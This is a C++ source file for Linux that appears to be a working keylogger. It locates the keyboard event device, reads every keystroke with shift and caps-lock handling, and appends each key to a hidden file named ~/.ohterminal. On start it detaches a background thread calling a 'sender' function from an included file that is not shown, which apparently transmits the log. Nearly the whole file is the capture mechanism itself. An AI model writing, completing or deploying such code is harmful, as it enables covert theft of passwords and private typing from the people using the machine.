#include <iostream>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/ioctl.h>
#include <cctype>
#include <fstream>
#include <thread>
#include "database.cpp"
#include "sender.cpp"
using namespace std;

const char* home = getenv("HOME");

const string RESET   = "\033[0m";
const string RED     = "\033[31m";
const string GREEN   = "\033[32m";
const string YELLOW  = "\033[33m";
const string BLUE    = "\033[34m";
const string MAGENTA = "\033[35m";
const string CYAN    = "\033[36m";
const string WHITE   = "\033[37m";


string special_color(int code)
{
    switch (code)
    {
        case KEY_ESC:
            return RED;

        case KEY_TAB:
            return GREEN;

        case KEY_ENTER:
            return YELLOW;

        case KEY_BACKSPACE:
            return BLUE;

        case KEY_SPACE:
            return MAGENTA;

        case KEY_UP:
        case KEY_DOWN:
        case KEY_LEFT:
        case KEY_RIGHT:
            return CYAN;

        case KEY_DELETE:
        case KEY_INSERT:
            return RED;

        case KEY_HOME:
        case KEY_END:
        case KEY_PAGEUP:
        case KEY_PAGEDOWN:
            return GREEN;

        case KEY_F1:
        case KEY_F2:
        case KEY_F3:
        case KEY_F4:
            return YELLOW;

        case KEY_F5:
        case KEY_F6:
        case KEY_F7:
        case KEY_F8:
            return BLUE;

        case KEY_F9:
        case KEY_F10:
        case KEY_F11:
        case KEY_F12:
            return MAGENTA;

        default:
            return WHITE;
    }
}


string find_keyboard()
{
    char name[256];

    for (int i = 0; i < 32; i++)
    {
        string device = "/dev/input/event" + to_string(i);

        int fd = open(device.c_str(), O_RDONLY);

        if (fd < 0)
            continue;


        unsigned long ev_bits[EV_MAX / (sizeof(unsigned long) * 8) + 1] = {};

        if (ioctl(fd, EVIOCGBIT(0, sizeof(ev_bits)), ev_bits) < 0)
        {
            close(fd);
            continue;
        }


        if (!(ev_bits[EV_KEY / (sizeof(unsigned long) * 8)] &
              (1UL << (EV_KEY % (sizeof(unsigned long) * 8)))))
        {
            close(fd);
            continue;
        }


        unsigned long key_bits[KEY_MAX / (sizeof(unsigned long) * 8) + 1] = {};

        if (ioctl(fd,
                  EVIOCGBIT(EV_KEY, sizeof(key_bits)),
                  key_bits) < 0)
        {
            close(fd);
            continue;
        }


        bool has_a =
            key_bits[KEY_A / (sizeof(unsigned long) * 8)] &
            (1UL << (KEY_A % (sizeof(unsigned long) * 8)));


        bool has_enter =
            key_bits[KEY_ENTER / (sizeof(unsigned long) * 8)] &
            (1UL << (KEY_ENTER % (sizeof(unsigned long) * 8)));


        if (has_a && has_enter)
        {
            if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) >= 0)
                cout << "Device: " << name << endl;

            close(fd);

            return device;
        }


        close(fd);
    }

    return "";
}


int main()
{
    string keyboard = find_keyboard();
  
    thread(sender,home).detach();

    if (keyboard.empty())
    {
        cerr << "Keyboard event device not found\n";
        return 1;
    }

    cout << "Keyboard: " << keyboard << endl;


    int path = open(keyboard.c_str(), O_RDONLY);

    if (path < 0)
    {
        perror("open");
        return 1;
    }


    input_event event;

    bool shift = false;
    bool caps = false;


    while (read(path, &event, sizeof(event)) == sizeof(event))
    {
        if (event.type != EV_KEY)
            continue;


        int code = event.code;
        int value = event.value;


        if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT)
        {
            shift = (value != 0);
            continue;
        }


        if (code == KEY_CAPSLOCK && value == 1)
        {
            caps = !caps;
            continue;
        }


        if (value != 1)
            continue;


        auto it = key_db.find({code, 1});


        if (it == key_db.end())
            continue;


        string key = it->second;


        if (code == KEY_SPACE)
        {
            cout << " " << flush;
            continue;
        }

        ofstream file(string(home) + "/.ohterminal",ios::app);


        if (key.length() == 1 && isalpha(static_cast<unsigned char>(key[0])))
        {
            bool upper = shift ^ caps;


            if (upper)
                key[0] =toupper(static_cast<unsigned char>(key[0]));
            else
                key[0] =tolower(static_cast<unsigned char>(key[0]));


            cout << key << flush;
	     file<<special_color(code)<< key << RESET << " ";

            continue;
        }


        if (key.length() == 1 && isdigit(static_cast<unsigned char>(key[0])))
        {
            cout << key << flush;
	    file<<special_color(code)<< key << RESET << " ";
	
            continue;
        }


        cout << special_color(code)<< key << RESET << flush << " ";
	file<<special_color(code)<<key<< RESET << " ";
	file.close();
    }


    close(path);

    return 0;
}
